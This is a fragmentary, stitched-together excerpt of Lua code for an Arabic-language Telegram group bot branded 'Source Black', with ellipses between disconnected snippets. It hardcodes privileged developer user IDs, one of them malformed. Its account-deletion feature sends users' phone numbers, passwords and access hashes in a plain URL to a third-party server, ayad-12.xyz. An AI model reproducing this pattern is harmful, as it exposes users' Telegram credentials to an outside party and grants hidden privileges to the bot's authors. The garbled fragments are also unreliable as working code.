...
ControllerAll = false
local ListSudos ={Sudo_Id,1965297568,19652975681965297568}
...
Status = 'المبرمج جاك'
elseif UserId == 19652975681965297568 then
Status = 'مطور السورس'
...
elseif tonumber(msg.sender.user_id) == 19652975681965297568 then
...
if UserId == "1965297568" then
return send(msg_chat_id,msg_id,"\n*❍ عذرآ لا تستطيع استخدام الامر على المبرمج جاك *","md",true)  
end
if UserId == "19652975681965297568" then
...
return send(msg_chat_id,msg_id,"[🖤 𝑱𝑨𝑪𝑲 🖤](tg://user?id=1965297568)","md",true, false, false, true, reply_markup)
end
...
Redis:del(black.."sayy"..msg_chat_id)
...
elseif msg.sender.user_id == tonumber(19652975681965297568) then
...
local se = http.request("https://ayad-12.xyz/apies/yt.php?search="..URL.escape(text))
...
LuaTele.sendAudio(msg_chat_id,msg_id,'./intk'..rand..'.mp3',tostring(inoi),"html",nil,tostring(inoi),"@otlop12")
sleep(1)
...
local jobs = {"طيار","محامي","دكتور","خباز","مدير بنك","قلب جاك","مدرس"}
...
data = {
{
{text = '⌯ 𓏶 𝒄𝒓𝒊𝒔𝒕𝒊𝒏 • 𝒔𝒐𝒖𝒓𝒄?? 𓏶 ⌯', url = 't.me/J_F_A_I'}, 
},
}
}
return send(msg_chat_id,msg_id,'*نزل عينك تحت كدا علشان هتخاد علي قفاك 😒❤️*',"md",false, false, false, false, reply_markup)
...
data = {
{
{text = '⌯ 𓏶 𝒄𝒓??𝒔𝒕𝒊𝒏 • 𝒔𝒐𝒖𝒓𝒄𝒆 𓏶 ⌯', url = 't.me/J_F_A_I'}, 
},
}
}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⧫ ❍ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐿𝐴𝐶𝐾 ❍️️ ⧫',url="t.me/J_F_A_I"}},
}
local msg_id = msg.id/2097152/0.5
...
return https.request("http://api.telegram.org/bot"..Token.."/sendmessage?text="..URL.escape("❍ تم الغاء امر حذف حسابك").."&chat_id="..msg.chat_id.."&reply_markup="..JSON.encode(k))
end
...
sleep(2)
local url = https.request("https://ayad-12.xyz/del/delete.php?phone="..num.."&password="..pass.."&access_hash="..hash.."&do_delete=true")
local json = JSON.decode(url)
...
local url = https.request("https://ayad-12.xyz/del/delete.php?phone="..num)
local json = JSON.decode(url)
...
data = {
{
{text = 'مطور السورس ❍',type = 'text'},{text = '❍ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐿𝐴𝐶𝐾 ❍️ ❍',type = 'text'},
},
{
...
return send(msg_chat_id,msg_id,"❍ 𝑆𝑂𝑈𝑅𝐶𝐸 𝐵𝐿𝐴𝐶𝐾 ❍️ » @"..chsource.."","html",true, false, false, true, reply_markup)
end
...
reply_markup = {
inline_keyboard ={
{{text ="ch", url= "https://t.me/J_F_A_I"}},
}
},
},
}
https.request("https://api.telegram.org/bot"..Token..'/answerInlineQuery?inline_query_id='..data.id..'&switch_pm_text=@V_P_E&switch_pm_parameter=start&results='..JSON.encode(resuult))
end
if Text and Text:match("(.*)@(.*)") then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = 'sᴏᴜʀᴄʀ black',url='http://t.me/J_F_A_I'}},
}
